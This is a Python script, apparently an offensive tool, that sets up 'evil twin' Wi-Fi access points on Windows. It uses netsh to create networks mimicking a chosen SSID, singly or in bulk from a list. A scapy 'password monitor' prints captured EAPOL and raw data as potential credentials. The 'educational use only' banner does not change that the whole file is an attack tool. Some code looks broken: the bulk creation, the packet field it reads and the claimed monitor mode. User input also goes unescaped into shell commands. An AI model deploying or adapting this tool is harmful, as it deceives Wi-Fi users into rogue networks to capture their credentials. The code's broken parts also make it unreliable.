import os
import sys
import time
import subprocess
from scapy.all import *
from colorama import Fore, init

init(autoreset=True)  # Colorama init

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""{Fore.RED}
   ▄████████ ███▄▄▄▄      ▄██████▄     ▄████████    ▄█   ▄█▄    ▄████████ 
  ███    ███ ███▀▀▀██▄   ███    ███   ███    ███   ███ ▄███▀   ███    ███ 
  ███    █▀  ███   ███   ███    ███   ███    █▀    ███▐██▀     ███    █▀  
  ███        ███   ███  ▄███▄▄▄▄██▀  ▄███▄▄▄       ▄█████▀     ▄███▄▄▄     
▀███████████ ███   ███ ▀▀███▀▀▀▀▀   ▀▀███▀▀▀      ▀▀█████▄    ▀▀███▀▀▀     
         ███ ███   ███ ▀███████████   ███    █▄     ███▐██▄     ███    █▄ 
   ▄█    ███ ███   ███   ███    ███   ███    ███   ███ ▀███▄   ███    ███ 
 ▄████████▀   ▀█   █▀    ███    ███   ██████████   ███   ▀█▀   ██████████ 
                          ███    ███                                      
    {Fore.RESET}{Fore.CYAN}[ Fake Wi-Fi Creator (Evil Twin) - Windows 11 ]{Fore.RESET}
    {Fore.YELLOW}⚠ WARNING: For Educational & Ethical Use Only! ⚠{Fore.RESET}
    """
    print(banner)

def enable_wifi_support():
    """Enable Wi-Fi hosted network support"""
    try:
        subprocess.run('netsh wlan set hostednetwork mode=allow', shell=True, check=True)
        print(f"{Fore.GREEN}[+] Hosted network support enabled.{Fore.RESET}")
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[-] Failed to enable hosted network support. Run as Admin!{Fore.RESET}")
        sys.exit(1)

def create_fake_wifi(ssid, password=None):
    """Create a fake Wi-Fi network"""
    try:
        if password:
            subprocess.run(f'netsh wlan set hostednetwork ssid="{ssid}" key="{password}" keyUsage=persistent', shell=True, check=True)
            print(f"{Fore.GREEN}[+] Fake Wi-Fi '{ssid}' created with password: {password}{Fore.RESET}")
        else:
            subprocess.run(f'netsh wlan set hostednetwork ssid="{ssid}" keyUsage=persistent', shell=True, check=True)
            print(f"{Fore.GREEN}[+] Fake Wi-Fi '{ssid}' created (Open Network){Fore.RESET}")
        
        subprocess.run('netsh wlan start hostednetwork', shell=True, check=True)
        print(f"{Fore.GREEN}[+] Fake Wi-Fi '{ssid}' is now active!{Fore.RESET}")
        return True
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[-] Failed to create fake Wi-Fi.{Fore.RESET}")
        return False

def bulk_create_from_file(file_path, has_password=False, default_password=None):
    """Create multiple fake Wi-Fi networks from a file"""
    if not os.path.exists(file_path):
        print(f"{Fore.RED}[-] File not found: {file_path}{Fore.RESET}")
        return
    
    with open(file_path, 'r') as file:
        ssids = [line.strip() for line in file if line.strip()]
    
    for ssid in ssids:
        if has_password and default_password:
            create_fake_wifi(ssid, default_password)
        else:
            create_fake_wifi(ssid)
        time.sleep(2)  # Delay to avoid conflicts

def packet_handler(pkt):
    """Capture Wi-Fi handshakes (for educational purposes)"""
    if pkt.haslayer(EAPOL):
        print(f"{Fore.RED}[!] Possible password attempt detected on network: {pkt.info.decode()}{Fore.RESET}")
        if pkt.haslayer(Raw):
            print(f"{Fore.RED}[!] Raw data (potential credentials): {pkt.load.hex()}{Fore.RESET}")

def monitor_mode():
    """Monitor mode to detect password attempts"""
    print(f"{Fore.YELLOW}[*] Starting monitor mode (Ctrl+C to stop)...{Fore.RESET}")
    try:
        sniff(iface="Wi-Fi", prn=packet_handler, store=0)
    except KeyboardInterrupt:
        print(f"{Fore.RED}[!] Stopping monitor mode.{Fore.RESET}")

def main():
    clear_screen()
    print_banner()
    enable_wifi_support()

    print(f"{Fore.CYAN}\n[1] Create Single Fake Wi-Fi")
    print("[2] Bulk Create from .txt/.lst File")
    print("[3] Start Password Monitor (Scapy)")
    print("[4] Exit\n")

    choice = input(f"{Fore.YELLOW}[?] Select an option (1-4): {Fore.RESET}")

    if choice == "1":
        ssid = input(f"{Fore.YELLOW}[?] Enter SSID to mimic: {Fore.RESET}")
        has_pass = input(f"{Fore.YELLOW}[?] Add password? (y/n): {Fore.RESET}").lower()
        if has_pass == "y":
            password = input(f"{Fore.YELLOW}[?] Enter fake password: {Fore.RESET}")
            create_fake_wifi(ssid, password)
        else:
            create_fake_wifi(ssid)
    
    elif choice == "2":
        file_path = input(f"{Fore.YELLOW}[?] Enter file path (.txt/.lst): {Fore.RESET}")
        has_pass = input(f"{Fore.YELLOW}[?] Use a default password for all? (y/n): {Fore.RESET}").lower()
        if has_pass == "y":
            password = input(f"{Fore.YELLOW}[?] Enter default password: {Fore.RESET}")
            bulk_create_from_file(file_path, True, password)
        else:
            bulk_create_from_file(file_path)
    
    elif choice == "3":
        monitor_mode()
    
    elif choice == "4":
        print(f"{Fore.RED}[!] Exiting...{Fore.RESET}")
        sys.exit(0)
    
    else:
        print(f"{Fore.RED}[-] Invalid choice!{Fore.RESET}")

if __name__ == "__main__":
    main()
